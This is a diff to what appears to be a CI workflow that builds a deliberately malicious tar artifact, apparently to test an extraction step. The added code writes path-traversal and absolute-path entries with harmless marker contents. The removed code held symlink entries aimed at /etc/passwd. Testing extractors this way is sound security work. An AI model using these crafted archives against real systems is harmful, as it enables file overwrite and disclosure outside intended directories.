@@ -14,39 +14,31 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Build malicious tar manually
+      - name: Build malicious tar
         run: |
-          mkdir -p out
-          echo "<h1>Index</h1>" > out/index.html
-          # Build the artifact tar manually with path-traversal entries
-          cd out
-          # Create a tarball that, when extracted, escapes
-          # Using Python to craft the tar with absolute and ../ entries
           python3 - <<'PYEOF'
           import tarfile, io, os
           tf = tarfile.open('/tmp/artifact.tar', 'w')
           # Normal entry
           ti = tarfile.TarInfo('index.html')
-          ti.size = len('<h1>Index</h1>\n')
-          tf.addfile(ti, io.BytesIO(b'<h1>Index</h1>\n'))
-          # Path traversal entry
-          ti2 = tarfile.TarInfo('../../../escaped.html')
-          ti2.size = 8
-          tf.addfile(ti2, io.BytesIO(b'ESCAPED\n'))
+          content = b'<h1>Pages Index</h1>\n'
+          ti.size = len(content)
+          tf.addfile(ti, io.BytesIO(content))
+          # Path traversal entry: ../escaped.html
+          ti2 = tarfile.TarInfo('../escaped.html')
+          c2 = b'ESCAPED_DOTDOT\n'
+          ti2.size = len(c2)
+          tf.addfile(ti2, io.BytesIO(c2))
+          # Deep traversal
+          ti3 = tarfile.TarInfo('../../../etc/escaped_deep.html')
+          c3 = b'ESCAPED_DEEP\n'
+          ti3.size = len(c3)
+          tf.addfile(ti3, io.BytesIO(c3))
           # Absolute path entry
-          ti3 = tarfile.TarInfo('/abs_escape.html')
-          ti3.size = 8
-          tf.addfile(ti3, io.BytesIO(b'ABSPATH\n'))
-          # Symlink entry to /etc/passwd
-          ti4 = tarfile.TarInfo('passwd_sym.html')
-          ti4.type = tarfile.SYMTYPE
-          ti4.linkname = '/etc/passwd'
-          tf.addfile(ti4)
-          # Symlink entry escaping
-          ti5 = tarfile.TarInfo('rel_passwd.html')
-          ti5.type = tarfile.SYMTYPE
-          ti5.linkname = '../../../etc/passwd'
-          tf.addfile(ti5)
+          ti4 = tarfile.TarInfo('/srv/abs_escape.html')
+          c4 = b'ESCAPED_ABS\n'
+          ti4.size = len(c4)
+          tf.addfile(ti4, io.BytesIO(c4))
           tf.close()
           PYEOF
           ls -la /tmp/artifact.tar
